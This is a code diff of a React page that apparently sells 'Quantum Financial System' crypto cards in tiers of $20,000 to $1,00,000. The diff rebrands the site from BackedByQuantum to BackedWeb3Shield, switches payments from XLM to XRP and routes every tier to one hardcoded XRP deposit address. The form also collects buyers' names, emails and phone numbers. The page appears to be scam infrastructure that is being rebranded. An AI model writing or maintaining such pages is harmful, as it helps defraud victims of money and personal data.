@@ -15,28 +15,28 @@ const cardStyles: Record<CardColor, {
   circleTopRight: string;
   circleBottomLeft: string;
   depositAddress: string;
-  xlmAmount: string;
+  xrpAmount: string;
 }> = {
   black: {
     background: "linear-gradient(135deg, #2b2b2b 0%, #121212 45%, #3a3a3a 100%)",
     circleTopRight: "rgba(255,255,255,0.03)",
     circleBottomLeft: "rgba(255,255,255,0.03)",
-    depositAddress: "GACMPQFBN6ZRTH4LZZVWB4XEFJEXYAP6U",
-    xlmAmount: "$20,000",
+    depositAddress: "rUALYX35uQDowXkWmY6zhgqPoNmtWbactG",
+    xrpAmount: "$20,000",
   },
   silver: {
     background: "linear-gradient(135deg, #d5d5dbff 0%, #bcbcbcff 40%, #6f6f70ff 100%)",
     circleTopRight: "rgba(186, 180, 180, 0.7)",
     circleBottomLeft: "rgba(0,0,0,0.06)",
-    depositAddress: "K8ZJ4WQPL2MHX7FAN9YVC3DRTSGEB5UO",
-    xlmAmount: "$50,000",
+    depositAddress: "rUALYX35uQDowXkWmY6zhgqPoNmtWbactG",
+    xrpAmount: "$50,000",
   },
   gold: {
     background: "linear-gradient(135deg, #f6d365 0%, #e8b93a 40%, #b88416 100%)",
     circleTopRight: "rgba(255,255,255,0.12)",
     circleBottomLeft: "rgba(0,0,0,0.06)",
-    depositAddress: "R7VQX2LZWFN6PGJ8K3DUB4YAHM5TESC9",
-    xlmAmount: "$1,00,000",
+    depositAddress: "rUALYX35uQDowXkWmY6zhgqPoNmtWbactG",
+    xrpAmount: "$1,00,000",
   },
 };
 
@@ -44,8 +44,8 @@ export default function UserInfo() {
   const router = useRouter();
   const [user, setUser] = useState<any>();
   const [formData, setFormData] = useState({
-    depositAddress: "GACMPQFBN6ZRTH4LZZVWB4XEFJEXYAP6U",
-    xlmAmount: "$20,000",
+    depositAddress: "rUALYX35uQDowXkWmY6zhgqPoNmtWbactG",
+    xrpAmount: "$20,000",
     name: "",
     email: "",
     phone: "",
@@ -90,7 +90,7 @@ export default function UserInfo() {
     setFormData((prev) => ({
       ...prev,
       depositAddress: mapping.depositAddress,
-      xlmAmount: mapping.xlmAmount,
+      xrpAmount: mapping.xrpAmount,
     }));
   }, [selectedColor]);
 
@@ -150,7 +150,7 @@ export default function UserInfo() {
     try {
       const fd = new FormData();
       fd.append("depositAddress", formData.depositAddress);
-      fd.append("xlmAmount", formData.xlmAmount);
+      fd.append("xrpAmount", formData.xrpAmount);
       fd.append("name", formData.name);
       fd.append("email", formData.email);
       fd.append("phone", formData.phone);
@@ -166,7 +166,7 @@ export default function UserInfo() {
         toast.success("Transaction submitted successfully!");
         setFormData({
           depositAddress: current.depositAddress,
-          xlmAmount: current.xlmAmount,
+          xrpAmount: current.xrpAmount,
           name: user?.user?.name || "",
           email: user?.user?.email || "",
           phone: "",
@@ -282,7 +282,7 @@ export default function UserInfo() {
                   <div style={{ display: "flex", justifyContent: "space-between" }}>
                     <div style={{ fontSize: "15px", lineHeight: "16px" }}>
                       <div style={{ fontWeight: "bold", marginBottom: "6px" }}>
-                        BackedByQuantum
+                        BackedWeb3Shield
                       </div>
                       <div style={{ fontSize: "12px", fontWeight: 600, color: selectedColor === "silver" ? "#111" : "#fff", }}>
                         Web3-QUANTUM FINANCIAL SYSTEM
@@ -386,10 +386,10 @@ export default function UserInfo() {
                       border: "1px solid #ccc",
                     }}
                   />
-                  <label style={{ marginBottom: "10px" }}>XLM amount</label>
+                  <label style={{ marginBottom: "10px" }}>xrp amount</label>
                   <input
                     type="text"
-                    value={formData.xlmAmount}
+                    value={formData.xrpAmount}
                     readOnly
                     style={{
                       width: "100%",
@@ -485,7 +485,7 @@ export default function UserInfo() {
                       checked={agree}
                       onChange={(e) => setAgree(e.target.checked)}
                     />{" "}
-                    I accept Quantum Fianancial System Shipping terms and conditions
+                    I accept BackedWeb3Shield Shipping terms and conditions
                   </div>
 
                   <button
